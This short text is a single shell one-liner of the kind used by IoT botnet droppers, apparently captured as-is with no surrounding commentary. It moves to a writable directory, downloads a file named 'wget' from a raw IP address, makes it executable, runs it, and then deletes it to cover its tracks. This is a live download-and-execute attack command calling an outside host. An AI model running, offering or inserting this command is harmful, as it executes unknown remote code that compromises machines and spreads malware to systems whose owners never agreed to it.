cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.207.149.84/wget; chmod +x wget; ./wget; rm -rf wget
